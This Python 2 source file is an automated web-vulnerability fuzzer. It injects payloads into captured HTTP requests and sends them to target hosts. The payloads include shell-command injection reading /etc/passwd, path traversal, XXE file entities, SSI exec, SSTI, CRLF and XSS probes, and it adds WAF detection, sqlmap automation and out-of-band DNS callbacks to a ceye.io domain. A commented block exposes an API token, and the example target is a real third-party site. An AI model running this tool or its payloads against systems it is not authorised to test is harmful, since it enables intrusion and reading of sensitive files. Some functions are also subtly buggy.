#coding=utf-8
import urlparse
import urllib2
import urllib
import re
import base64
import socket
import ssl
import sys
import random
#import MySQLdb
#from MySQLdb import escape_string
import time
import sqlite3
import os
import json
import requests
from selenium import webdriver


socket.setdefaulttimeout(10)

""" #SSRF、SQL盲注、命令执行盲注的root domain，如vscode.baidu.com
blind_reverse_domain = "pz35ac.ceye.io"

#sqlmap api server address
sqlmap_api_address = 'http://127.0.0.1:8775'

#盲注反射检测地址api
blind_reverse_api = 'http://api.ceye.io/v1/records?token=0c28dc05dc90d6ecaab7fa1f28d09d9b&type=%s&filter=%s' """

from config import *

domain_regx =  [r'([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}']

class fuzzer:
    def __init__(self,request,detect_type, para_str, host, req_url, http_method, keyword="", content_length="",cookie=""):#, status_code):
        #self.url = url
        #self.request = base64.b64decode(request).replace("Accept-Encoding: gzip.*\r\n","")
        #self.request = re.sub("Accept-Encoding: gzip.*\r\n", "" ,base64.b64decode(request))
        self.request = re.sub("gzip,", "" ,base64.b64decode(request))
        self.detect_type = detect_type
        self.keyword = keyword
        self.content_length = content_length
        self.host = host
        self.para_str = base64.b64decode(para_str)
        self.cookie = cookie
        self.req_url = req_url
        self.http_method = http_method
        #self.status_code = status_code
        #command injection paras

        # The white-spaces
        self.WHITESPACE = ["$IFS", "%20"]
        # The command injection suffixes.
        self.SUFFIXES = ["'", "\""]
        # The command injection separators.
        self.SEPARATORS = [";", "|", "&", "||"]
        # The command injection prefixes.
        self.PREFIXES = ["'", "\""]
        #需要配置
        self.blind_reverse_logo = self.host.replace(':','-')
        self.blind_reverse_domain = self.blind_reverse_logo + '.' + blind_reverse_domain
        self.base_command = ["ping command_exec."+self.blind_reverse_domain, "cat /etc/passwd", "type c:\windows\win.ini"]
        self.fuzzing_payloads_list = []



    def detect(self):
        global rhost,port,cu,cx,random_ip
        log_value = ""
        global rhost,port
        if "443" in self.host:
            rhost = self.host.split(":")[0]
            port = 443
        elif ":" in self.host:
            rhost = self.host.split(":")[0]
            port = int(self.host.split(":")[1])
        else:
            rhost = self.host
            port = 80
        
        try:
            #random_ip = self.domain_to_ip(rhost)[0]
            #直接调用本地dns，只有一个结果
            random_ip = socket.gethostbyname(rhost)
        except Exception,e:
            random_ip = ""
            #print e
        
        cx = sqlite3.connect("axefuzzer.db")
        cu = cx.cursor()
        try:
            cu.execute("CREATE TABLE IF NOT EXISTS wafs (waf_host VARCHAR(255), waf_ip VARCHAR(255), waf_type VARCHAR(255), pentest_date VARCHAR(255));")
        except Exception,e:
            print e
        try:
            cu.execute("CREATE TABLE IF NOT EXISTS vulns(host_name VARCHAR(255),vuln_request VARCHAR(2000), vuln_type VARCHAR(255),vuln_para VARCHAR(255),pentest_date VARCHAR(255));")
        except Exception,e:
            print e

       
        #预检测是否存在WAF，如果存在，不进行下一步，直接退出。
        try:
            waf_exist_sql = "SELECT count(*) FROM wafs WHERE waf_host = '%s' and waf_ip = '%s'"
            cu.execute(waf_exist_sql % (rhost , random_ip))
            waf_exist = cu.fetchone()[0]
            if not waf_exist:
                if self.waf_detect():
                    #waf_sql = "insert into wafs values ()"
                    return
            else:
                return

        except Exception,e:
            print e

        for detect_type in detect_types:
            eval('self.' + detect_type + '_detect')()

        """ if self.detect_type == "file_read":
            log_value = self.file_read_detect()
        elif self.detect_type == "xss_detect":
            log_value = self.xss_detect()
        elif self.detect_type == "dom_xss_detect":
            #if exsit geckodriver
            log_value = self.dom_xss_detect()

        elif self.detect_type == "url_redirect":
            log_value = self.url_redirect_detect()

        elif self.detect_type == "file_download":
           log_value = self.file_download_detect()
           #http头好像多个stream字段吧,判断是否下载请求。
        elif self.detect_type == "pass_by": 
            log_value = self.pass_by_detect()
        elif self.detect_type == "command_exec": 
            log_value = self.command_exec_detect()
            #if not log_value:
                #此处如果没有得到回显，可尝试检查reverse domain的结果
                #现在借助api已解决这类问题。
                #print "[+]Well, you could check the reverse domain for result here.\n"
        elif self.detect_type == "ssrf":
            log_value = self.ssrf_detect()
            #此处无法添加可匹配的regx，可尝试检查reverse domain的结果
            #现在借助api已解决这类问题。
            #print "[+]Well, you could check the reverse domain for result here.\n"
        elif self.detect_type == "xxe":
            log_value = self.xxe_detect()
        
        elif self.detect_type == "ssi":
            log_value = self.ssi_detect()

        elif self.detect_type == "ssti":
            log_value = self.ssti_detect()

        elif self.detect_type == "crlf":
            log_value = self.crlf_detect()

        elif self.detect_type == "sqli":
            log_value = self.sqli_detect()
        else:
            #return
            print "\n[+]Ummmm, no correct vulns fuzzing type here...\n" """

        #print log_value
        if log_value != False and log_value != None:
            print "[!]Well, maybe success exploit here!\n"
            self.log_print(self.detect_type)
        #else:
        #    print "[+]Maybe no vulns or here, you can wait for time-delay detect.\n"
        print "\n[+]Ummmm, "+self.detect_type+" fuzzing has been end...\n"

    def socket_request(self, request):
        if port == 443:
            s = ssl.wrap_socket(socket.socket())
        else:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #try:
        #print request
        print "Fuzzing " + rhost + ":"+ str(port) + ", please wait..."
        s.connect((rhost, port))
        s.send(request)
        try:
            while True:
                #这里是循环，但是还是一次接受完
                buf = s.recv(8096)
                if not len(buf):
                    break
                #print buf
                return buf
        except socket.timeout, e:
            print e
        except Exception,e :
            print e
        #return buf


    def random_str(self,randomlength=4):
        str = ''
        chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
        length = len(chars) - 1
        #random = Random()
        for i in range(randomlength):
            str+=chars[random.randint(0, length)]
            return str

    def reply_to_iplist(self,data):
        assert isinstance(data, basestring)
        iplist = ['.'.join(str(ord(x)) for x in s) for s in re.findall('\xc0.\x00\x01\x00\x01.{6}(.{4})', data) if all(ord(x) <= 255 for x in s)]
        return iplist

    #def domain_to_ip(self,domain):
    #    try:
    #        data2 = ""
    #        dnsserver = '8.8.8.8'
    #        seqid = os.urandom(2)
    #        host = ''.join(chr(len(x))+x for x in domain.split('.'))
    #        print host
    #        data = '%s\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00%s\x00\x00\x01\x00\x01' % (seqid, host)
    #        sock = socket.socket(socket.AF_INET,type=socket.SOCK_DGRAM)
    #        sock.settimeout(None)
    #        sock.sendto(data, (dnsserver, 53))
    #        data2 = sock.recv(512)
    #    except Exception,e:
    #        print e
    #    return self.reply_to_iplist(data2)

    def waf_detect(self):
        print "[+]Start waf_detect...\n"
        try:
            if not self.keyword:
                if  not len(self.para_str):
                    return False
                attack_para = self.para_str.split('&')[0] + "' and 1=1"
                request = self.request.replace(self.para_str.split('&')[0], attack_para)
                #print request
            else:
                attack_para = self.keyword + "' and 1=1"
                request = self.request.replace(self.keyword ,attack_para)
            attack_resp = self.socket_request(request)
        except Exception,e:
            print "[x]Waf detect error:%s"%(str(e))
            return False
       
        if 'safedog' in attack_resp:
            waf_type = 'safedog'
            print "[x]Maybe SafeDog waf here."
        elif '360safe' in attack_resp:
            waf_type = '360'
            print "[x]Maybe 360 waf here."
        elif '_D_SID' in attack_resp:
            waf_type = 'd_safe'
            print "[x]Maybe D waf here."
        elif 'X_Powered_By_360WZB' in attack_resp:
            waf_type = '360'
            print "[x]Maybe 360 Wangzhan waf here."
        elif 'jiasule' in attack_resp:
            waf_type = 'jiasule'
            print "[x]Maybe Jiasule waf here."
        elif  'yunsuo' in attack_resp:
            waf_type = 'yunsuo'
            print "[x]Maybe YunSuo waf here."
        #YunJiaSu is sb,wo zhe li mei zhao dao an li.
        elif  'dbappwaf' in attack_resp:
            waf_type = 'xuanwudun'
            print "[x]Maybe XuanWuDun waf here."
        elif  'yunaq.com' in attack_resp:
            waf_type = 'knownsec'
            print "[x]Maybe knownsec waf here."
        elif 'X_Safe_Firewall' in attack_resp:
            waf_type = 'others'
            print "[x]Unknown waf here."
        else:
            print "[+]Maybe no waf here!"
            return False
        #waf_sql = "insert into wafs values ('%s','%s','%s') where waf_host != '%s';"%(self.host, waf_type, pentest_date, self.host)
        waf_sql = "INSERT INTO wafs SELECT '%s', '%s', '%s', '%s' WHERE NOT EXISTS(SELECT waf_host FROM wafs WHERE waf_host = '%s' and waf_ip = '%s')"%(self.host, random_ip, waf_type, pentest_date, self.host, random_ip)
        cu.execute(waf_sql)
        cx.commit()
        #self.sql_manage(waf_sql)




    def log_print(self,vuln_type,para="None"):

        pentest_date = time.strftime('%Y-%m-%d',time.localtime(time.time()))
        resp_url = "[!]Vuln request:\n"+self.request+"\n"
        resp_type = "[!]Vuln type:"+vuln_type+"\n"
        resp_para = "[!]Vuln para:"+para+"\n"
        print resp_url+resp_type+resp_para
        f = open("log.txt","a+")
        f.writelines(resp_url+resp_type+resp_para)
        f.close()
        vuln_sql = "insert into vulns values('%s','%s','%s','%s','%s');"%(self.host ,self.request,vuln_type, para, pentest_date)
        cu.execute(vuln_sql)
        cx.commit()
        #self.sql_manage(vuln_sql)

        return True

    def fuzz_pre(self, fuzz_list , keyword_list, vuln_type, replace_option = False):
        return_value = ""
        if self.keyword == "":
            for para in self.para_str.split('&'):
                try:
                    if replace_option == True:
                        return_value = self.replace_fuzz(para,fuzz_list,keyword_list)
                    else:
                        return_value = self.fuzz(para,fuzz_list,keyword_list)
                except Exception, e:
                    #return_value = ""
                    print e
                if return_value != False and return_value != "":
                    self.log_print(vuln_type ,para)
                    #return True
                else:
                    continue
        else:
            para = self.keyword
            if replace_option == True:
                return_value = self.replace_fuzz(para,fuzz_list,keyword_list)
            return_value = self.fuzz(para, fuzz_list, keyword_list)
            if return_value != False:
                self.log_print(vuln_type ,para)
                #return True
            else:
                return False

    
    def sqli_detect(self):
        from AutoSqli import AutoSqli
        try:
            t = AutoSqli(sqlmap_api_address , self.req_url, self.para_str, '', self.cookie, self.request)
            t.deamon = True
            t.start()
        except Exception,e:
            print e
        #log_value = False
        print "[+]Please wait for sqli time-delay detect.\n"
        return False


    def ssi_detect(self):
        fuzz_list = ['<!--#exec cmd="cat /etc/passwd"-->','<!--#exec cmd="type c:\windows\win.ini"-->']
        keyword_list = [r"root:",r"\[extensions\]"]
        print "[+]Start ssi_detect...\n"
        if self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name, True):
            return True

    def ssti_detect(self):
        fuzz_list = ["${{572*1099}}"]
        keyword_list = [r"628628"]
        print "[+]Start ssti_detect...\n"
        if self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name, True):
            return True

    def crlf_detect(self):
        try:
            resp = self.socket_request(self.request)
        except Exception,e:
            return
            #print e
        #if "HTTP/1.1 30" in resp or "HTTP/1.0 30" in resp:#self.status_code:
        if re.search(r"HTTP\/1\.\w 30",resp):
            fuzz_list = ["%0aset-header：628<628;%0a","%0aset-header：628'628;%0a"]
            keyword_list = [r"628<628",r"628'628"]
            print "[+]Start crlf_detect...\n"
            if self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name):
                return True

    def xss_detect(self):
        #fuzz_list = ["'><Svg/onload=prompt(628628)><'","'><sCript defer>prompt(628628)</SCript><'"]
        fuzz_list = ["><628628","'\"628628"]
        keyword_list = [r"><628628",r"'\"628628"]
        print "[+]Start xss_detect...\n"
        if self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name):
            return True

    def dom_xss_detect(self):
        try:
            if port == 443:
                xml_url = "https://"+rhost
            else:
                xml_url = "http://"+rhost
            #if "GET" in self.request:
            #    request_type = "GET"
            #else:
            #    request_type = "POST"
            request_type = self.http_method
            jquery = open("jquery.min.js", "r").read()
            
            fireFoxOptions = webdriver.FirefoxOptions()
            fireFoxOptions.add_argument('user-agent="Mozilla/5.0"')

            fireFoxOptions.set_headless()
            driver = webdriver.Firefox(firefox_options=fireFoxOptions)
            
            driver.get(self.req_url)
            time.sleep(3)
            """ cookies = {}
            if self.cookie:
                for line in self.cookie.split(';'):
                    key,value = line.split('=',1)
                    cookies[key] = value """
            if self.cookie:
                for name,value in self.cookie:
                    driver.add_cookie({'name':  name, 'value': value})
            
            driver.execute_script(jquery) # ensure we have jquery


            fuzz_list = ["><628628","'\"628628"]
            keyword_list = [r"><628628",r"'\"628628"]
            for para in self.para_str.split('&'):
                for item in fuzz_list:
                    vector_value =  para + str(item)
                    paras = self.para_str.replace(para,vector_value)



                    #分离出参数
                    data = {}
                    for item in paras.split('&'):
                        key = item.split('=')[0]
                        value = item.split('=')[1]
                        data[key] = value

                    ajax_query = '''
                    $.ajax('%s', {
                    type: '%s',
                    data: %s, 
                    headers: { "User-Agent": "Mozilla/5.0" },
                    crossDomain: true,
                    xhrFields: {
                    withCredentials: true
                    },
                    success: function(){}
                    });
                    ''' % (self.req_url, request_type, str(data))
                    ajax_query = ajax_query.replace(" ", "").replace("\n", "")
                    resp = driver.execute_script("return " + ajax_query)
                    print resp
                    try:
                        for keyword in keyword_list:
                            match = re.search(keyword,''.join(resp))
                            if match and "301 Moved" not in resp and "302 Found" not in resp:
                                print "[!]Match success!\n"
                                print "================================="
                                print '[+]Ajax request may successed.'
                                print resp
                                print "================================="
                                return True
                            else:
                                continue
                                #return False
                    except Exception,e:
                        print "[!]Match error:"+str(e)+"\n"
                        #return False
                    driver.close()
        except Exception,e:
            print e
        

    def file_read_detect(self):
        fuzz_list = ["../../../../../../../../../../../etc/passwd","%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd","../../../../../../../../../../windows/win.ini","c:\windows\win.ini","/etc/passwd"]
        keyword_list = [r"root:",r"\[extensions\]"]
        print "[+]Start file_read_detect...\n"
        if self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name, True):
            return True


    def url_redirect_detect(self):
        fuzz_list = ["@www.baidu.com","http://www.baidu.com"]
        keyword_list = [r"bd_logo1", r"http:\/\/www.baidu.com"]
        print "[+]Start url_redirect_detect...\n"
        if self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name , True):
            return True
    
    #貌似有新的解决办法,通过下载流的关键词来甄别:
    def file_download_detect(self):
        fuzz_list = ["../../../../../../../../../../../etc/passwd","%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd","../../../../../../../../../../windows/win.ini","c:\windows\win.ini","/etc/passwd"]
        keyword_list = [r"Content-Type:application\/octet-stream"]
        print "[+]Start file_download_detect...\n"
        if self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name):
            return True

    #此处通过content-length大小来比较。
    def pass_by_detect(self):
        print "[+]Start pass_by_detect...\n"
        orignal_resp = self.socket_request(self.request)
        if 'Cookie:' in self.request:
            current_request = self.request.replace('Cookie: ','Cookie: '+self.random_str())
            current_resp = self.socket_request(current_request)
        else:
            return False
        try:
            if len(orignal_resp) == len(current_resp):
                #self.log_print("pass_by_detect")
                return True
            else:
                return False
        except Exception, e:
            print e
            return False

    def ssrf_detect(self):
        #建议应该做成替换字符串，或者直接替换匹配的参数值？
        print "[+]Start ssrf_detect...\n"
        fuzz_list =  ["ssrf." + self.blind_reverse_domain]
        #if not self.keyword:
        keyword_list=""
        for para in self.para_str.split('&'):
            self.replace_fuzz(para,fuzz_list,keyword_list,domain_regx)
        ssrf_resp = requests.get(blind_reverse_api%('request','ssrf.' + self.blind_reverse_domain)).content
        try:
            ssrf_resp_data = json.loads(ssrf_resp)['data']
            if len(ssrf_resp_data):
                return True
        except Exception,e:
            print e

    def xxe_detect(self):
        print "[+]Start xxe_detect...\n"
        fuzz_list = ['file:///etc/passwd', 'file:///c:/windows/win.ini', 'http://xxe.' + self.blind_reverse_domain ]
        keyword_list = [r"root:",r"\[extensions\]"]
        try:
            xml_data = re.search(r'<\?\bxml.*', self.request, re.S).group(0)
        except Exception,e:
            return False
        xml_post = '''<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "%s" >]><user>&xxe;</user>'''
        for fuzz_item in fuzz_list:
            req_header = self.request.replace(xml_data, xml_post%(fuzz_item))
            #print req_header
            xxe_resp = self.socket_request(req_header)
            for keyword in keyword_list:
                    match = re.search(keyword,''.join(xxe_resp))
                    if match and "301 Moved" not in resp and "302 Found" not in xxe_resp:
                        print "[!]Match success!\n"
                        return True
                    else:
                        continue




    #command injection all functions

    def add_prefixes(self, payload, prefix):
        payload = prefix + payload

        return payload

    def add_suffixes(self, payload, suffix):
        payload = payload + suffix

        return payload

    def add_sp_before(self, payload, sp):
        if payload:
            return sp + payload
        else:
            return ''

    def add_single_quote(self, s):
        if s:
            return "'{}'".format(s)
        else:
            return ''

    def add_double_quotes(self, s):
        if s:
            return '"{}"'.format(s)
        else:
            return ''

    def replace_space(self, payload, whitespace):
        if payload:
            return payload.replace(' ', whitespace)
        else:
            return ''

    # `whoami`
    def add_backquote(self, payload):
        if payload:
            return "`{}`".format(payload)
        else:
            return ''

    # $(reboot)
    def add_brackets(self, payload):
        if payload:
            return "$({})".format(payload)
        else:
            return ''

    def fuzz_mypayloads(self):
        #Get from OCIFT
        for whitespace in self.WHITESPACE:
            for prefix in self.PREFIXES:
                for suffix in self.SUFFIXES:
                    for sp in self.SEPARATORS:
                        for cmd in self.base_command:
                            payloads = []
                            # index.php?id=cat /etc/passwd
                            payloads += [cmd]
                            # index.php?id=`cat /etc/passwd`
                            payloads += [self.add_backquote(cmd)]
                            # index.php?id=$(cat /etc/passwd)
                            payloads += [self.add_brackets(cmd)]
                            # index.php?id=;cat /etc/passwd
                            payloads += [self.add_sp_before(cmd, sp)]
                            # index.php?id=;`cat /etc/passwd`
                            payloads += [self.add_sp_before(self.add_backquote(cmd), sp)]
                            # index.php?id=;$(cat /etc/passwd)
                            payloads += [self.add_sp_before(self.add_brackets(cmd), sp)]
                            # index.php?id=cat$IFS/etc/passwd
                            payloads += [self.replace_space(cmd, whitespace)]
                            # index.php?id=;cat$IFS/etc/passwd
                            payloads += [self.replace_space(self.add_sp_before(cmd, sp), whitespace)]
                            # index.php?id='cat /etc/passwd'
                            for payload in payloads:
                                add_payload = self.add_prefixes(payload, prefix)
                                add_payload = self.add_suffixes(add_payload, suffix)
                                #添加额外payload和原定payload
                                self.fuzzing_payloads_list.extend([payload,add_payload])
                            


    def command_exec_detect(self):
        self.fuzz_mypayloads()
        fuzz_list = list(set(self.fuzzing_payloads_list))
        keyword_list = [r"root:",r"\[extensions\]"]
        #print self.fuzzing_payloads_list
        #第三个参数为漏洞类型，第四个参数为是否启用替换参数
        if self.fuzz_pre(fuzz_list , keyword_list, sys._getframe().f_code.co_name):
            return True
        command_exec_resp = requests.get(blind_reverse_api%('dns','command_exec.'+self.blind_reverse_domain)).content
        try:
            command_exec_resp_data = json.loads(command_exec_resp)['data']
            if len(command_exec_resp_data):
                return True
        except Exception,e:
            print e

    

        
    def fuzz(self, para, fuzz_list, keyword_list):
        for item in fuzz_list:
            vector_value =  para + str(item)
            try:
                attack_request = self.request.replace(para,vector_value)
                if self.content_length != "":
                    item_length = len(item)+int(self.content_length)
                    attack_request = attack_request.replace("Content-Length: "+str(self.content_length) , "Content-Length: "+str(item_length))
                resp = self.socket_request(attack_request)
                for keyword in keyword_list:
                    match = re.search(keyword,''.join(resp))
                    if match and "301 Moved" not in resp and "302 Found" not in resp:
                        print "[!]Match success!\n"
                        print "================================="
                        print attack_request
                        print resp
                        print "================================="
                        return True
                    else:
                        continue
                        #return False
            except Exception,e:
                print "[!]Match error:"+str(e)+"\n"
                #return False
        return False


    def replace_fuzz(self, para, fuzz_list, keyword_list , replace_regx = ""): 
        para_pre = para.split('=')[0]
        para_suf = para.split('=')[1]
        for item in fuzz_list:
            if replace_regx:
                for replace_regx_item in replace_regx:
                    vector_value =  str(para_pre) + '=' + re.sub(replace_regx_item, item ,para_suf)
            else:
                vector_value = str(para_pre) + '=' +str(item)
            try:
                attack_request = self.request.replace(para,vector_value)
                if self.content_length != "":
                    item_length = len(item)+int(self.content_length)-len(para_suf)
                    attack_request = attack_request.replace("Content-Length: "+str(self.content_length) , "Content-Length: "+str(item_length))
                resp = self.socket_request(attack_request)
                for keyword in keyword_list:
                    match = re.search(keyword,''.join(resp))
                    if match and "301 Moved" not in resp and "302 Found" not in resp:
                        print "[!]Match success!\n"
                        print "================================="
                        print attack_request
                        print resp
                        print "================================="
                        return True
                    else:
                        continue
                        #return False
            except Exception,e:
                print "[!]Match error:"+str(e)+"\n"
                #return False
        return False




if __name__ == "__main__":
    exp_url = "http://www.tvsou.com/column/index.asp?id=yuQ17S"
    #keyword = "id"
    #fuzzer = fuzzer(url,keyword)
    #fuzzer = fuzzer(url)
    #fuzzer.detect()
            
                
            
        
        
    
